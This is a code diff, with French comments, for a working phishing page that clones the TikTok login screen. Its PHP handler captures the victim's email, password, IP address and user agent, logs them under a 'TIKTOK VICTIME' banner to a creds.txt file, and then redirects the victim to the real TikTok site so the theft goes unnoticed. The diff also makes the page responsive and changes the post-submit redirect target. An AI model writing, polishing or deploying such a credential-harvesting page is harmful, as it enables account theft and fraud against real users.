@@ -1,10 +1,6 @@
 <?php
 if ($_POST) {
-    // IP réelle
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
-        ?? $_SERVER['HTTP_X_REAL_IP']
-        ?? $_SERVER['REMOTE_ADDR']
-        ?? 'inconnue';
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
     $ip = trim(explode(',', $ip)[0]);
 
     $email = $_POST['email'] ?? '';
@@ -12,7 +8,6 @@ if ($_POST) {
     $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
     $time  = date('Y-m-d H:i:s');
 
-    // Format pour TikTok
     $log  = "┌─────────────────────────────────────────\n";
     $log .= "│ 🎯 TIKTOK VICTIME — {$time}\n";
     $log .= "├─────────────────────────────────────────\n";
@@ -23,7 +18,9 @@ if ($_POST) {
     $log .= "└─────────────────────────────────────────\n";
 
     file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
-    header('Location: terminal.php?newhit=1');
+    
+    // Redirection vers TikTok (permet à la victime de voir la vraie page)
+    header('Location: https://www.tiktok.com/');
     exit;
 }
 ?>
@@ -34,7 +31,7 @@ if ($_POST) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok - Connexion</title>
     <style>
-        /* TikTok CSS Clone */
+        /* TikTok CSS Clone - Responsive */
         body {
             background-color: #000;
             color: #fff;
@@ -49,7 +46,8 @@ if ($_POST) {
         
         .login-container {
             text-align: center;
-            width: 300px;
+            width: 100%;
+            max-width: 300px;
             padding: 20px;
         }
         
@@ -141,6 +139,17 @@ if ($_POST) {
             font-weight: 600;
             text-decoration: none;
         }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                max-width: 280px;
+                padding: 16px;
+            }
+            .logo {
+                font-size: 36px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -159,26 +168,20 @@ if ($_POST) {
             Vous n'avez pas de compte ? <a href="#" class="signup-link">S'inscrire</a>
         </div>
     </div>
-   <script>
-const form = document.querySelector('form[method="POST"][action="terminal.php"]');
 
-form.addEventListener('submit', function(e) {
-    e.preventDefault(); // bloque le comportement classique du submit
-
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.text()) // optionnel, récupère la réponse du serveur
-    .then(data => {
-        console.log(data); // juste pour debug
-        // redirection après envoi
-        window.location.href = 'https://www.facebook.com/';
-    })
-    .catch(error => console.error('Erreur:', error));
-});
-     </script>
+    <script>
+        // Script pour rediriger après capture
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                window.location.href = 'https://www.tiktok.com/';
+            });
+        });
+    </script>
 </body>
 </html>
